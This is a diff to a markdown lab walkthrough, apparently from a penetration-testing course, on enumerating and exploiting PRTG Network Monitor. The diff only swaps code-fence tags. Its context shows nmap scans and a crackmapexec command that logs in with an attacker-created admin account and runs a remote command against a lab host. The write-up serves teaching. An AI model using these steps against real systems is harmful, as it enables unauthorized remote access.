@@ -4,7 +4,7 @@ PRTG Network Monitor is agentless network monitor software. It can be used to mo
 ## Discovery/Footprinting/Enumeration
 We can quickly discover PRTG from an Nmap scan. It can typically be found on common web ports such as `80`, `443`, or `8080`. It is possible to change the web interface port in the Setup section when logged in as an admin.
 
-```sh
+```shellsession
 $ sudo nmap -sV -p- --open -T4 10.129.201.50
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
@@ -50,7 +50,7 @@ http://10.129.201.50:8080/index.htm
 ## Questions
 1. What version of PRTG is running on the target? **Answer: 18.1.37.13946**
    - Identify the target's PRTG version by running a nmap scan:
-        ```sh
+        ```shellsession
         $ sudo nmap -p- -T4 --open -sV 10.129.48.212
         Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-17 06:57 EDT
         Nmap scan report for 10.129.48.212
@@ -84,7 +84,7 @@ http://10.129.201.50:8080/index.htm
    - Click on `Send test Notification` to trigger the command:
         ![alt text](prtg_send_noti.png)
    - Use crackmapexec to log in as local admin and read the flag:
-        ```sh
+        ```shellsession
         $ sudo crackmapexec smb 10.129.50.90 -u prtgadm1 -p Pwn3d_by_PRTG! -X 'more C:/Users/Administrator/Desktop/flag.txt'
         SMB         10.129.50.90    445    APP03            [*] Windows 10 / Server 2019 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:None)
         SMB         10.129.50.90    445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
